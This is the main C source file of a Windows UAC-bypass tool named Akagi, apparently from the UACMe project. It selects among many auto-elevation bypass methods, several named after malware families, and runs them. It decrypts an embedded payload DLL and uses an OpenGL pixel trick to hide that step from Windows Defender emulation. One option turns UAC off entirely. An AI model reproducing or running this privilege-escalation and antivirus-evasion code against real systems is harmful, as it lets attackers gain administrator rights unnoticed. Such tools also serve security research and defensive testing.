/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2016
*
*  TITLE:       MAIN.C
*
*  VERSION:     2.01
*
*  DATE:        04 Jan 2016
*
*  Program entry point.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#define OEMRESOURCE
#include "global.h"
#include <VersionHelpers.h>
#include <gl\GL.h>
#pragma comment(lib, "opengl32.lib")

UACMECONTEXT g_ctx;

static pfnDecompressPayload pDecryptPayload = NULL;

#if (_MSC_VER >= 1900) 
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif

/*
* DummyWindowProc
*
* Purpose:
*
* Part of antiemulation, does nothing, serves as a window for ogl operations.
*
*/
LRESULT CALLBACK DummyWindowProc(
	HWND hwnd, 
	UINT uMsg, 
	WPARAM wParam, 
	LPARAM lParam
	)
{
	switch (uMsg) {
	case WM_CLOSE:
		PostQuitMessage(0);
		break;
	}
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

/*
* ucmInit
*
* Purpose:
*
* Prestart phase with MSE / Windows Defender anti-emulation part.
*
*/
UINT ucmInit(
	VOID
	)
{
	BOOL cond = FALSE;
	DWORD Result = ERROR_SUCCESS;
	PVOID       Ptr;
	MSG         msg1;
	WNDCLASSEX  wincls;
	HINSTANCE   inst = GetModuleHandle(NULL);
	BOOL        rv = 1;
	HWND        TempWindow;
	HGLRC       ctx;
	HDC         dc1;
	int         index;
#ifndef _DEBUG
	TOKEN_ELEVATION_TYPE    ElevType;
#endif	

	ULONG bytesIO, dwType;
	WCHAR szBuffer[MAX_PATH + 1];
	WCHAR WndClassName[] = TEXT("reirraC");
	WCHAR WndTitleName[] = TEXT("igakA");

	PIXELFORMATDESCRIPTOR pfd = {
		sizeof(PIXELFORMATDESCRIPTOR),
		1,
		PFD_DRAW_TO_WINDOW | PFD_SUPPORT_OPENGL | PFD_DOUBLEBUFFER | PFD_SWAP_EXCHANGE | PFD_GENERIC_ACCELERATED,
		PFD_TYPE_RGBA,
		32, 8, 0, 8, 0, 8, 0, 8, 0,
		0, 0, 0, 0, 0, 32, 0, 0,
		PFD_MAIN_PLANE, 0, 0, 0, 0
	};

	do {

		//fill common data block
		RtlSecureZeroMemory(&g_ctx, sizeof(g_ctx));

		dwType = 0;
		bytesIO = 0;
		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
		GetCommandLineParam(GetCommandLine(), 1, szBuffer, MAX_PATH, &bytesIO);
		if (bytesIO == 0) {
			return ERROR_BAD_ARGUMENTS;
		}
		g_ctx.Method = strtoul(szBuffer);
		if (g_ctx.Method == 0 || g_ctx.Method >= UacMethodMax) {
			return ERROR_BAD_ARGUMENTS;
		}

#ifndef _DEBUG
		ElevType = TokenElevationTypeDefault;
		if (supGetElevationType(&ElevType)) {
			if (ElevType != TokenElevationTypeLimited) {			
				return ERROR_UNSUPPORTED_TYPE;
			}
		}
#endif

		wincls.cbSize = sizeof(WNDCLASSEX);
		wincls.style = CS_OWNDC;
		wincls.lpfnWndProc = &DummyWindowProc;
		wincls.cbClsExtra = 0;
		wincls.cbWndExtra = 0;
		wincls.hInstance = inst;
		wincls.hIcon = NULL;
		wincls.hCursor = (HCURSOR)LoadImage(NULL, MAKEINTRESOURCE(OCR_NORMAL), IMAGE_CURSOR, 0, 0, LR_SHARED);
		wincls.hbrBackground = NULL;
		wincls.lpszMenuName = NULL;
		wincls.lpszClassName = WndClassName;
		wincls.hIconSm = 0;
		RegisterClassEx(&wincls);

		TempWindow = CreateWindowEx(WS_EX_TOPMOST, WndClassName, WndTitleName,
			WS_VISIBLE | WS_POPUP | WS_CLIPCHILDREN | WS_CLIPSIBLINGS, 0, 0, 30, 30, NULL, NULL, inst, NULL);


		//remember dll handles
		g_ctx.hKernel32 = GetModuleHandleW(T_KERNEL32);
		if (g_ctx.hKernel32 == NULL) {
			Result = ERROR_INVALID_HANDLE;
			break;
		}

		g_ctx.hOle32 = GetModuleHandleW(T_OLE32);
		if (g_ctx.hOle32 == NULL) {
			g_ctx.hOle32 = LoadLibraryW(T_OLE32);
			if (g_ctx.hOle32 == NULL) {
				Result = ERROR_INVALID_HANDLE;
				break;
			}
		}
		g_ctx.hShell32 = GetModuleHandleW(T_SHELL32);
		if (g_ctx.hShell32 == NULL) {
			g_ctx.hShell32 = LoadLibraryW(T_SHELL32);
			if (g_ctx.hShell32 == NULL) {
				Result = ERROR_INVALID_HANDLE;
				break;
			}
		}

		//query basic directories
		if (GetSystemDirectoryW(g_ctx.szSystemDirectory, MAX_PATH) == 0) {
			Result = ERROR_INVALID_DATA;
			break;
		}

		//query build number
		RtlSecureZeroMemory(&g_ctx.osver, sizeof(g_ctx.osver));
		g_ctx.osver.dwOSVersionInfoSize = sizeof(g_ctx.osver);
		if (!NT_SUCCESS(RtlGetVersion(&g_ctx.osver))) {
			Result = ERROR_INVALID_ACCESS;
			break;
		}

		if (g_ctx.osver.dwBuildNumber < 7000) {
			Result = ERROR_INSTALL_PLATFORM_UNSUPPORTED;
			break;
		}

		g_ctx.IsWow64 = supIsProcess32bit(GetCurrentProcess());

		//flashes and sparks
		dc1 = GetDC(TempWindow);
		index = ChoosePixelFormat(dc1, &pfd);
		SetPixelFormat(dc1, index, &pfd);
		ctx = wglCreateContext(dc1);
		wglMakeCurrent(dc1, ctx);
		glDrawBuffer(GL_BACK);
		glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);
		glMatrixMode(GL_PROJECTION);
		glLoadIdentity();
		glBegin(GL_TRIANGLES);
		glColor4i(1, 0, 1, 0);
		glVertex2i(-1, -1);
		glVertex2i(0, 1);
		glVertex2i(1, -1);
		glEnd();
#pragma warning(disable: 4054)//code to data
		Ptr = (PVOID)&DecompressPayload;
#pragma warning(default: 4054)
		pDecryptPayload = NULL;
#ifdef _WIN64
		glDrawPixels(2, 1, GL_RGBA, GL_UNSIGNED_BYTE, &Ptr);
		glReadPixels(0, 0, 2, 1, GL_RGBA, GL_UNSIGNED_BYTE, (GLvoid *)&pDecryptPayload);
#else
		glDrawPixels(1, 1, GL_RGBA, GL_UNSIGNED_BYTE, &Ptr);
		glReadPixels(0, 0, 1, 1, GL_RGBA, GL_UNSIGNED_BYTE, (GLvoid *)&pDecryptPayload);
#endif
		SwapBuffers(dc1);
		SendMessage(TempWindow, WM_CLOSE, 0, 0);

		do {
			rv = GetMessage(&msg1, NULL, 0, 0);

			if (rv == -1)
				break;

			TranslateMessage(&msg1);
			DispatchMessage(&msg1);
		} while (rv != 0);

		UnregisterClass(WndClassName, inst);
		
		switch (g_ctx.Method) {

		case UacMethodAVrf:
			g_ctx.PayloadDll = pDecryptPayload((PVOID)HIBIKIDLL, sizeof(HIBIKIDLL), &g_ctx.PayloadDllSize);
			break;

		default:
			g_ctx.PayloadDll = pDecryptPayload((PVOID)FUBUKIDLL, sizeof(FUBUKIDLL), &g_ctx.PayloadDllSize);
			break;
		}

		if (g_ctx.PayloadDll == NULL) {
			Result = ERROR_INVALID_DATA;
			break;
		}

	} while (cond);

	return Result;
}

/*
* ucmMain
*
* Purpose:
*
* Program entry point.
*
*/
UINT ucmMain()
{
	DWORD  paramLen;
	WCHAR  *pDllName;
	WCHAR  szBuffer[MAX_PATH + 1];
	UINT   uResult;

#ifdef GENERATE_COMPRESSED_PAYLOAD
	CompressPayload();
#endif
	uResult = ucmInit();

	switch (uResult) {

	case ERROR_UNSUPPORTED_TYPE:
		ucmShowMessage(TEXT("Admin account with limited token required."));
		break;

	case ERROR_INSTALL_PLATFORM_UNSUPPORTED:
		ucmShowMessage(TEXT("This Windows version is not supported."));
		break;

	case ERROR_BAD_ARGUMENTS:
		ucmShowMessage(TEXT("Usage: Akagi.exe [Method] [OptionalParamToExecute]"));
		break;
	default:
		break;

	}
	if (uResult != ERROR_SUCCESS) {
		return ERROR_INTERNAL_ERROR;
	}

	//check OS version first
	switch (g_ctx.Method) {
	
	case UacMethodSysprep1://cryptbase
		if (g_ctx.osver.dwBuildNumber > 9200) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
		break;

	case UacMethodSysprep2://shcore
		if (g_ctx.osver.dwBuildNumber != 9600) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
		break;

	case UacMethodSysprep3://dbgcore
		if (g_ctx.osver.dwBuildNumber != 10240)	{
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
		break;

	case UacMethodOobe://oobe service
		if (g_ctx.osver.dwBuildNumber >= 10548) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
		break;

	case UacMethodRedirectExe:
#ifndef _WIN64
		if (g_ctx.osver.dwBuildNumber > 9600) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
#else 
		ucmShowMessage(WOW64WIN32ONLY);
		return ERROR_UNSUPPORTED_TYPE;
#endif
		break;

	case UacMethodSimda:
		if (g_ctx.osver.dwBuildNumber >= 10136) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
		break;

	case UacMethodCarberp1:
		if (g_ctx.osver.dwBuildNumber >= 10147) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
		break;

	case UacMethodCarberp2:
		if (g_ctx.osver.dwBuildNumber >= 10147) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
		break;

	case UacMethodTilon:
		if (g_ctx.osver.dwBuildNumber > 9200) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
		break;

	case UacMethodAVrf:
		if (g_ctx.osver.dwBuildNumber >= 10136) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
		break;

	case UacMethodWinsat:
		if (g_ctx.osver.dwBuildNumber >= 10548) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
		break;

	case UacMethodShimPatch:
#ifndef _WIN64
		if (g_ctx.osver.dwBuildNumber > 9600) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
#else
		ucmShowMessage(WOW64WIN32ONLY);
		return ERROR_UNSUPPORTED_TYPE;
#endif
		break;

	case UacMethodMMC:
#ifndef _WIN64
		ucmShowMessage(WIN64ONLY);
		return ERROR_UNSUPPORTED_TYPE;
#endif	
		break;

	case UacMethodSirefef:
		if (g_ctx.osver.dwBuildNumber >= 10548) {
			if (ucmShowQuestion(UACFIX) == IDNO)
				return ERROR_UNSUPPORTED_TYPE;
		}
		break;

	case UacMethodGeneric:
		//future use
		break;

	case UacMethodGWX:
		if (g_ctx.osver.dwBuildNumber < 7600) {
			ucmShowMessage(OSTOOOLD);
			return ERROR_UNSUPPORTED_TYPE;
		}
		break;
	}

	//prepare command for payload
	paramLen = 0;
	RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
	GetCommandLineParam(GetCommandLine(), 2, szBuffer, MAX_PATH, &paramLen);
	if (paramLen > 0) {
		if (g_ctx.Method != UacMethodRedirectExe) {
			supSetParameter((LPWSTR)&szBuffer, paramLen * sizeof(WCHAR));
		}
	}


	//check environment and execute method if it met requirements
	switch (g_ctx.Method) {

	case UacMethodSysprep1:
	case UacMethodSysprep2:
	case UacMethodSysprep3:
	case UacMethodOobe:
	case UacMethodTilon:

#ifndef _DEBUG
		if (g_ctx.IsWow64) {
			ucmShowMessage(WOW64STRING);
			return ERROR_UNSUPPORTED_TYPE;
		}
#endif
		
		if (ucmStandardAutoElevation(g_ctx.Method, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
			return ERROR_SUCCESS;
		}
		break;

//
//  Allow only in 32 version.
//
#ifndef _WIN64
	case UacMethodRedirectExe:
	case UacMethodShimPatch:
		if (ucmAppcompatElevation(g_ctx.Method, g_ctx.PayloadDll, g_ctx.PayloadDllSize, (paramLen != 0) ? szBuffer : NULL )) {
			return ERROR_SUCCESS;
		}
		break;
#endif

	case UacMethodSimda:

#ifndef _DEBUG
		if (g_ctx.IsWow64) {
			ucmShowMessage(WOW64STRING);
			return ERROR_UNSUPPORTED_TYPE;
		}
#endif
		if (MessageBox(GetDesktopWindow(),
			TEXT("This method will TURN UAC OFF, are you sure? You will need to reenable it after manually."),
			PROGRAMTITLE, MB_ICONQUESTION | MB_YESNO) == IDYES) 
		{
			if (ucmSimdaTurnOffUac()) {
				return ERROR_SUCCESS;
			}
		}
		break;

	case UacMethodCarberp1:
	case UacMethodCarberp2:

		if (g_ctx.Method == UacMethodCarberp1) {

			//there is no migmiz in syswow64 in 8+
			if ((g_ctx.IsWow64) && (g_ctx.osver.dwBuildNumber > 7601)) {
				ucmShowMessage(WOW64STRING);
				return ERROR_UNSUPPORTED_TYPE;
			}
		}

		if (g_ctx.Method == UacMethodCarberp2) {
#ifndef _DEBUG
			if (g_ctx.IsWow64) {
				ucmShowMessage(WOW64STRING);
				return ERROR_UNSUPPORTED_TYPE;
			}
#endif
		}

		if (ucmWusaMethod(g_ctx.Method, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
			return ERROR_SUCCESS;
		}
		break;

	case UacMethodAVrf:
#ifndef _DEBUG
		if (g_ctx.IsWow64) {
			ucmShowMessage(WOW64STRING);
			return ERROR_UNSUPPORTED_TYPE;
		}
#endif		
		if (ucmAvrfMethod(g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
			return ERROR_SUCCESS;
		}
		break;

	case UacMethodWinsat:
#ifndef _DEBUG
		if (g_ctx.IsWow64) {
			ucmShowMessage(LAZYWOW64UNSUPPORTED);
			return ERROR_UNSUPPORTED_TYPE;
		}
#endif
		if (g_ctx.osver.dwBuildNumber < 9200) {
			pDllName = L"powrprof.dll";
		}
		else {
			pDllName = L"devobj.dll";
		}

		if (ucmWinSATMethod(pDllName, g_ctx.PayloadDll, g_ctx.PayloadDllSize, (g_ctx.osver.dwBuildNumber <= 10136))) {
			return ERROR_SUCCESS;
		}
		break;

	case UacMethodMMC:
#ifndef _DEBUG
		if (g_ctx.IsWow64) {
			ucmShowMessage(WOW64STRING);
			return ERROR_UNSUPPORTED_TYPE;
		}
#endif
		pDllName = L"elsext.dll";
		if (ucmMMCMethod(pDllName, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
			return ERROR_SUCCESS;
		}
		break;

	case UacMethodSirefef:
#ifndef _DEBUG
		if (g_ctx.IsWow64) {
			ucmShowMessage(WOW64STRING);
			return ERROR_UNSUPPORTED_TYPE;
		}
#endif
		if (ucmSirefefMethod(g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
			return ERROR_SUCCESS;
		}
		break;

	case UacMethodGeneric:
#ifndef _DEBUG
		if (g_ctx.IsWow64) {
			ucmShowMessage(WOW64STRING);
			return ERROR_UNSUPPORTED_TYPE;
		}
#endif
		pDllName = L"ntwdblib.dll";
		if (ucmGenericAutoelevation(METHOD_SQLSRV_TARGETAPP, pDllName, g_ctx.PayloadDll, g_ctx.PayloadDllSize))
			return ERROR_SUCCESS;
		
		break;

	case UacMethodGWX:
#ifndef _DEBUG
		if (g_ctx.IsWow64) {
			ucmShowMessage(WOW64STRING);
			return ERROR_UNSUPPORTED_TYPE;
		}
#endif
		if (ucmGWX()) {
			return ERROR_SUCCESS;
		}
		break;

	}
	
	return ERROR_ACCESS_DENIED;
}

VOID main()
{
	UINT uResult;

	uResult = ucmMain();
	if (uResult == ERROR_SUCCESS) {
		OutputDebugString(RESULTOK);
	}
	else
	{
		OutputDebugString(RESULTFAIL);
	}
	ExitProcess(uResult);
}
